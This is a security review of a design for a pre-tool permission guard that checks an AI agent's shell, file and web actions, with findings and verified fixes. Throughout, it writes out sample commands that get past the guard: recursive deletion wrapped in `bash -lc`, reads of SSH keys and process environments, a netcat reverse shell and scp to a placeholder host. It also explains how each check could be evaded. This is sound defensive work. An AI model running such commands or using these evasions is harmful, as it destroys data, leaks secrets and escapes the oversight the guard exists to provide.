# Security Architecture Review — Plan 5: Permission Engine, Pre-Tool Guard, and Shell Safety

**Plan reviewed:** `docs/superpowers/plans/2026-07-03-permission-engine-pre-tool-guard-shell-safety.md`
**Reviewer role:** Senior Architect Lead / Network Security
**Date:** 2026-07-03
**Prior review:** `docs/superpowers/reviews/2026-07-03-plan-5-architect-review.md` (Opus 4.8) — approved on correctness grounds after 3 rounds (B1–B7, R1, R2 resolved).

---

## Re-review (Round 2) — security hardening verified — APPROVED

The author folded this review into the plan (now 2340 lines, new `### Security Boundary Notes` section). I re-read the revised permission policy, command validator, pre-tool guard, and audit sanitizer, and re-ran my full adversarial suite (19 shell cases + 8 force-push variants + 4 sanitizer cases) against the revised logic. **Every previously-exploitable path now resolves to BLOCK or HOLD; nothing an attacker controls reaches ALLOW.** All blocking items are closed.

| # | Sev | Status | Verified behaviour in revised plan |
|---|-----|--------|-------------------------------------|
| S1 | High | **Fixed** | Shell surface now fails closed. `_validate_command` ends in `HOLD shell.unclassified_command`; interpreter args (`bash/sh/python -c …`) are `shlex`-parsed and re-validated recursively — unsafe payload BLOCKs, ambiguous payload HOLDs `shell.opaque_interpreter`. Confirmed `bash -lc "rm -rf src"` → BLOCK, `bash -lc "echo hi"` → HOLD, `make release` → HOLD. |
| S2 | High | **Fixed** | `_is_force_push_to_protected_branch` normalizes `-f`/`--force*`, `+refspec`, `HEAD:main`, `--force-with-lease=main`, and `master`. All 8 variants DENY; non-protected `git push -f origin feature` correctly not denied. |
| S3 | High | **Fixed** | `_credential_read` scans every arg via `_is_secret_path` + `/proc/*/environ`, independent of `argv[0]`. `strings id_rsa`, `head .env`, `cat /proc/self/environ` all BLOCK. |
| S4 | High | **Fixed** | `_non_http_egress` holds `scp/sftp/ssh/ftp/nc/ncat/netcat/telnet` and non-HTTP schemes. `scp … evil:/tmp` and `nc -e /bin/sh` → HOLD `network.non_http_egress`. |
| S5 | Med | **Fixed** | rm flags are lower-cased and joined across tokens; `rm -R -f`, `rm -r -f`, `rm -RF` all BLOCK. |
| S6 | Med | **Fixed** | Text is NFKC-normalized; confusable set + `xn--` punycode check. Cyrillic host and punycode host BLOCK. `unicodedata`/`shlex` now actually used (closes S13). |
| S7 | Med | **Fixed** | `_redact_secret_values` masks URL userinfo, `Authorization: Bearer`, `--password`, `api[_-]?key`, and `token=` by value. No leaks across my four probes; the substring-`replace` mangling is gone. |
| S8 | Med | **Documented + partial** | WEB now routes through `NetworkSafetyValidator`; MCP has an explicit HOLD branch (`mcp.requires_plan6_trust_registry`). Security Boundary Notes state the guard is not a choke point until a central dispatcher + Plan 6 land. Appropriate for Phase 1. |
| S9 | Med | **Documented** | Boundary Notes acknowledge approval is coarse and specify the future binding (command hash, path scope, surface, approver, run/session id, expiry). Correct call to defer. |
| S10/S12/S13 | Low | **Fixed/Documented** | `first_time_tool` is now propagated by `check()` and holds (S12); "append-only" reframed as in-memory stub → Plan 7 (S10); `shlex`/`unicodedata` used (S13). |

Doc-quality claims independently confirmed: no trailing whitespace, and the only stale-marker hit is the intentional self-review sentence.

**Disposition: approved to implement.** The plan's default posture is now fail-closed on the shell surface, the deny rules actually deny their common variants, and the audit log no longer leaks the secrets it records. Residual **non-blocking** hardening for Plan 6: (a) the pipe/fetch-exec alternations still omit `python/node/ruby/perl` as exec targets — these now HOLD via the fail-closed default rather than ALLOW, so it is a review prompt, not a bypass; (b) the interpreter recursion tracks `depth` but never bounds it (relies on `shlex` + Python's recursion limit; still fails closed); (c) `_rejected_web_decision` hardcodes `policy_signal`/`reason_code` (audit fidelity, prior M2); (d) exact-component secret matching can still false-positive on a dir literally named `secrets`/`token` (fails safe). None gate this plan.

---

## 1. Scope and method

This review is **security-focused**. It assumes the correctness findings in the Opus 4.8 review are resolved (verified — the plan now has ALLOW dispositions for approved surfaces, a unified `ValidationVerdict`, real control bytes in tests, and an additive evidence `__init__`). My question is different: **once this plan is green and running, how strong is the security boundary it claims to be?**

I traced every detector in the plan against the live code in `src/optimus/runtime/*`, `src/optimus/tools/*`, `src/optimus/evidence/*`, and `src/optimus/net/https.py`, and I executed the plan's regexes and path/rm/sanitizer logic against adversarial inputs to confirm each bypass empirically (not by inspection alone).

**Verdict: Approve as a foundational scaffold, but do not represent it as an enforcing security control until S1 and S2 are fixed.** The plan's architecture (deny-before-allow, mode short-circuit, classifier-cannot-overturn-deny, block-before-spawn ordering) is sound and worth keeping. But the shell/egress/credential detectors are a **fail-open denylist**, and the single most common evasion — wrapping anything in `bash -lc "…"` — defeats the flagship controls and lands on an `ALLOW` default. The README/self-review language ("blocks destructive commands, credential/environment access, unexpected egress, and Unicode confusables") overstates what the code does and should be softened to match actual coverage.

---

## 2. Security posture at a glance

The system has **two contradictory defaults** and the B1/B2 fixes routed the hot path onto the unsafe one:

- **Permission layer** fails *closed*: an unknown, unapproved request with no matching rule falls through to `HOLD classifier.not_configured`. Good.
- **Deterministic validators** fail *open*: `CommandSafetyValidator.validate()` ends with `return ValidationResult(ALLOW, "shell.allowed", …)` for anything no rule matched (plan line 919). Bad.

After the B1 fix, an **approved** agent shell/file/web action now gets `ALLOW` at the permission layer (`allow.shell.agent_pre_tool_validation`, line 437–444) precisely so it reaches the validators — which then default to ALLOW. So the effective default disposition for an approved Agent action is **ALLOW unless a specific denylist pattern fires**. That inverts the plan's own stated posture (Scope, line 48): *"it is allowed to hold ambiguous syntax instead of trying to prove it safe."* As written it proves nothing and allows by default.

---

## 3. Findings

| # | Severity | Finding | Effect |
|---|----------|---------|--------|
| S1 | **High** | Shell validation is argv-structured + regex denylist over a `" ".join(command)` string, with a fail-open ALLOW default. `bash -lc "…"` / `sh -c` / `python -c` wrap the real payload in one opaque arg. | Flagship controls (rm-rf, credential-read) inspect `argv[0]` and never see the payload; compound fetch-execute via `&&` has no pipe to match. Arbitrary dangerous command reaches ALLOW. |
| S2 | **High** | `deny.git.force_push_main` matches only literal `--force`/`--force-with-lease` + `" main"`. After B1, misses no longer fall to HOLD — they fall to `allow.shell.agent_pre_tool_validation` **ALLOW**. | `git push -f origin main`, `git push origin +main`, `…master` execute despite an advertised deny. A named deny rule is bypassable to execution — violates deny-before-allow. |
| S3 | **High** | Credential-file reads are blocked only when `argv[0] ∈ {cat, type, Get-Content}`. Secret-path deny at the permission layer only inspects `target_path`, which is `None` for shell. | `head/less/grep/strings/xxd/sort id_rsa`, `strings ~/.aws/credentials`, `python -c "open('.env').read()"`, and `cat /proc/self/environ` all reach ALLOW. `.env` is caught only *accidentally* by the over-broad env regex. |
| S4 | **High** | Egress control inspects only `http(s)://` URLs found by regex; the host allowlist never sees non-HTTP channels. | Reverse shells (`nc -e /bin/sh evil 4444`), `scp secret evil:/`, `ssh`, `ftp://`, `file://`, and raw-IP fetches fail open to ALLOW. |
| S5 | Medium | `rm -rf` detector is case-sensitive (`"r" in token`) and requires r+f in a single token. | `rm -R -f`, `rm -r -f`, `rm -RF`, `rm -Rf` bypass. The most common destructive command is under-detected even in bare argv form. |
| S6 | Medium | "Unicode/homoglyph" = an 8-codepoint Cyrillic denylist. No NFKC normalization, no mixed-script detection, no punycode handling. `unicodedata` is in the tech stack but never imported. | Greek/fullwidth/other-Cyrillic homoglyphs and `xn--` punycode hosts bypass. Also false-positive BLOCKs legitimate non-ASCII shell content. |
| S7 | Medium | `_sanitize_subject` redacts a fixed list of *filenames* by substring, not secret *values*. | Bearer tokens, `--password=…`, and `https://user:pass@host` userinfo are written to the audit log verbatim; benign tokens are mangled (`tokenizer.py` → `**********izer.py`). The audit trail leaks the secrets it's meant to protect. |
| S8 | Medium | The guard is opt-in per call site (`guard: … | None = None`), not a choke point. No `_validate_surface` branch for `ToolSurface.MCP`. | Any direct `subprocess`/`Path.write_text`, any new tool, or a caller-supplied permissive guard bypasses all checks. MCP — a prime injection surface — gets no deterministic validation (can only HOLD). |
| S9 | Medium | `approval_granted` is a single boolean that simultaneously satisfies MutationGuard, flips permission to ALLOW, and clears the high-impact HOLD. It is not bound to the specific action. | The command/path validated by the guard need not be the one the human approved. No binding (command hash / path scope) → approval substitution and replay are undetectable. |
| S10 | Low | "Append-only" audit is an in-memory `list` with a lock; no tamper-evidence, lost on restart. | Fine as a Phase-1 stub (durable store deferred to Plan 7), but the README/self-review "append-only" claim overstates the guarantee. |
| S11 | Low | Validation and side effect are not atomic; the guard validates a path string and `write_file` re-derives `Path(path)` at write time; `resolve()` is not re-checked at the syscall. | Classic TOCTOU / symlink-swap window between check and write. Small in a single in-order process, but real. |
| S12 | Low | `first_time_tool` → HIGH impact is dead through the guard: `PreToolRequest` has no such field and `check()` never sets it (H4 in prior review). | The advertised trust-on-first-use gate for new/MCP tools never fires. |
| S13 | Low | `shlex` and `unicodedata` are named in the tech stack (line 9) but neither is used. | The two normalization primitives that would close S1 (tokenize the `-c` payload) and S6 (NFKC/skeleton) are specced but absent — the gap is structural, not incidental. |

S2, S3(partial), S5, S6, S8(MCP), S12 overlap with the prior review's H2/H3/H4/M4/M6 notes. I am re-raising them because the **B1/B2 fixes changed their risk class**: items the prior review reasonably called "safe-ish, falls to HOLD" now fall to **ALLOW**, because approved shell commands are no longer held. What was a latent quality note is now an exploitable path.

---

## 4. The central issue (S1), demonstrated

`shell_exec` runs `subprocess.run(list(command))` with no shell. So when the agent wants a shell, `argv` *is* the interpreter: `("bash", "-lc", "<payload>")`. The validator does `text = " ".join(command)` and applies detectors that assume argv structure:

- `_is_recursive_force_delete` checks `Path(command[0]).name.lower() == "rm"`. For `("bash","-lc","rm -rf /")`, `argv[0]` is `bash`, so **the rm-rf check never fires**. Confirmed by execution.
- `_credential_read` checks `argv[0] ∈ {cat,type,get-content}`. `bash -lc "cat .env"` → `argv[0]` is `bash` → **not checked**.
- `_PIPE_TO_SHELL` needs a literal `| sh`. `bash -lc "curl https://gw/x -o /tmp/x && sh /tmp/x"` uses `&&`, **no match** — and if the fetch host is the allowlisted gateway, the URL check returns ALLOW too.

Net: `bash -lc "rm -rf /"`, `bash -lc "cat ~/.ssh/id_rsa"`, and fetch-execute via `&&` all return `shell.allowed / ALLOW` and proceed to `subprocess.run`. The block-before-spawn ordering is real, but it guards a validator that doesn't look inside the only argument that matters.

This is not a corner case — `bash -lc`/`sh -c` is the normal way an LLM agent runs shell. A denylist over the flattened string cannot bound an embedded shell grammar. The plan already anticipated this ("allowed to hold ambiguous syntax") but the implementation does the opposite.

---

## 5. Recommended fixes

**Must fix in this plan (they contradict the plan's own invariants):**

1. **S1 — make the shell surface fail closed.** When `argv[0]` is an interpreter (`bash/sh/zsh/dash/pwsh/powershell/python*/node/ruby/perl` with `-c`/`-lc`/`-e`/`-Command`), the argument is opaque shell — the validator cannot prove it safe, so it must `HOLD`, not `ALLOW`. More generally, flip the terminal default for the shell surface from `ALLOW` to `HOLD` for anything outside a positive allowlist, and run the denylist detectors on the *parsed* payload (this is what `shlex` was specced for). Keep the fast allowlist (`pytest`, read-only `git`) as the ALLOW path.
2. **S2 — normalize before the force-push deny.** Resolve `-f`↔`--force`, detect `+refspec` force form, and match `main`/`master` regardless of separator (`HEAD:main`, `refs/heads/main`). A rule advertised as a deny must actually deny its common variants; today it degrades to ALLOW.

**Fix before this is relied on as a control (fold into Plan 6 guardrail hardening if not now):**

3. **S3 — decouple credential-read from `argv[0]`.** Scan every argument (and the parsed `-c` payload from fix 1) for secret-path tokens using the shared `_is_secret_path`, and add `/proc/*/environ`. Don't depend on the reader binary.
4. **S4 — broaden egress.** Extend detection beyond `http(s)://` to `ssh/scp/sftp/ftp/file/nc/telnet` invocations and bare-IP fetches; hold or block unlisted destinations rather than ignoring non-URL egress.
5. **S5 — robust rm/destructive parsing.** Case-insensitive flag parsing, treat split flags (`-r -f`) as combined, and cover `find … -delete`, `shred`, `dd of=…`, truncation (`: > file`, `> file`), and `git reset --hard`/`git clean -fdx` as HOLD-worthy.
6. **S6 — real confusable handling.** NFKC-normalize, detect mixed-script identifiers in hostnames, and reject/hold `xn--` punycode for non-allowlisted hosts. Use `unicodedata` as the tech stack intends; scope the check to hostnames/URLs to avoid false positives on file content.
7. **S7 — redact values, not filenames.** Mask `Authorization:`/`Bearer`/`--password`/`-p`/`api[_-]?key`/URL userinfo by pattern; drop the substring `.replace()` approach that mangles benign tokens. This matters more than any other audit change because a leaky audit log is worse than none.

**Design notes to record (non-blocking):**

8. **S8/S9 — enforcement and binding.** State explicitly that the guard is advisory until a central tool dispatcher makes it the *only* path to side effects, and that approval is currently coarse. A follow-up should bind the approval token to a hash of the exact command/path scope so the guard can detect substitution. Add the missing `ToolSurface.MCP` validation branch (or document that MCP can only HOLD in Phase 1).
9. **S10/S12/S13** — soften the "append-only" wording to "in-memory audit stub (durable store: Plan 7)", and either wire `first_time_tool` through `PreToolRequest` or drop it from Scope so the advertised control surface matches reality.

---

## 6. What the plan gets right (preserve through rework)

The bones are good and several properties are genuinely correct: deny-before-allow ordering and the classifier's inability to overturn a deny are structurally enforced; Plan/Chat mode short-circuits shell/write/web/MCP before any allow evaluation; the guard runs **before** the runner/writer/transport so block-before-spawn holds for anything actually detected; workspace containment via `resolve(strict=False)` correctly follows symlinks and blocks escapes; HTTPS-only is enforced on the network surface; and the secret-path deny at the permission layer is correct **for the file surfaces where `target_path` is populated**. The fix set above hardens the detectors and flips the shell default — it does not require re-architecting these parts.

---

## 7. Disposition

**Approve to implement as a foundation, with S1 and S2 treated as in-plan blockers** because they violate the plan's stated fail-closed posture and its deny-before-allow invariant respectively. S3–S7 should be closed before any downstream system trusts this guard as a security boundary; they are natural Plan 6 hardening items. Regardless of scheduling, **update the README and Self-Review language now** so the shipped claim ("blocks destructive commands, credential/environment access, unexpected egress, and Unicode confusables") is scoped to "detects an enumerated set of…" — the current wording invites reliance the code cannot yet support.
